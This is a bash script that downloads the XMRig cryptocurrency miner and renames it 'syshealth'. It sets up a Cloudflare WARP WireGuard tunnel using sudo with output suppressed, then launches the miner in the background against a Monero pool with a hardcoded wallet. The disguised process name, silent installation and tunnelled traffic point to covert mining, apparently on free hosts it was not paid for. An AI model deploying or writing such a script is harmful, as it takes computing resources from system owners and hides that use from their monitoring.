#!/bin/bash
# warp-mine.sh - Mine using Cloudflare WARP (FREE, no VPS needed)

WALLET="49J8k2f3qtHaNYcQ52WXkHZgWhU4dU8fuhRJcNiG9Bra3uyc2pQRsmR38mqkh2MZhEfvhkh2bNkzR892APqs3U6aHsBcN1F"
POOL_URL="pool.supportxmr.com:443"
WORKER_NAME="worker-$(tr -dc 'a-z0-9' </dev/urandom | head -c 6)"

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

# Download miner if needed
if [ ! -f "$SCRIPT_DIR/syshealth" ]; then
  echo "Downloading XMRig..."
  curl -sL https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz | tar xz -C /tmp
  mv /tmp/xmrig-6.21.0/xmrig "$SCRIPT_DIR/syshealth"
  chmod +x "$SCRIPT_DIR/syshealth"
  rm -rf /tmp/xmrig-*
fi

# Download warp-go directly (doesn't need root)
echo "Downloading Cloudflare WARP-GO..."
cd "$SCRIPT_DIR"

# Use wgcf to generate WireGuard config (simpler approach)
if [ ! -f "wgcf" ]; then
  ARCH="amd64"
  if [ "$(uname -m)" = "aarch64" ]; then
    ARCH="arm64"
  fi
  
  curl -sL "https://github.com/ViRb3/wgcf/releases/download/v2.2.22/wgcf_2.2.22_linux_${ARCH}" -o wgcf
  chmod +x wgcf
fi

# Generate WARP config
if [ ! -f "wgcf-profile.conf" ]; then
  echo "Registering with Cloudflare WARP..."
  yes | ./wgcf register >/dev/null 2>&1 || true
  ./wgcf generate
fi

# Install and configure WireGuard
echo "Installing WireGuard..."
if command -v apt-get >/dev/null 2>&1; then
  export DEBIAN_FRONTEND=noninteractive
  sudo apt-get update -qq >/dev/null 2>&1
  sudo apt-get install -y wireguard-tools >/dev/null 2>&1
fi

# Start WireGuard tunnel
echo "Starting WARP tunnel..."
sudo cp wgcf-profile.conf /etc/wireguard/wgcf.conf
sudo wg-quick up wgcf 2>/dev/null || true
sleep 5

# Verify connection
echo "Testing WARP connection..."
if curl -m 10 https://api.ipify.org 2>/dev/null; then
  echo "✓ WARP connected successfully!"
else
  echo "ERROR: WARP connection failed"
  sudo wg-quick down wgcf 2>/dev/null || true
  exit 1
fi

# Start miner (direct connection via WARP tunnel)
echo "Starting XMRig with WARP..."
cd "$SCRIPT_DIR"
nohup ./syshealth \
  --url="$POOL_URL" \
  --user="$WALLET" \
  --pass="$WORKER_NAME" \
  --tls \
  --keepalive \
  --donate-level=1 \
  --log-file=xmrig.log \
  > /dev/null 2>&1 &

echo "Mining started with Cloudflare WARP!"
echo "Check logs: tail -f $SCRIPT_DIR/xmrig.log"
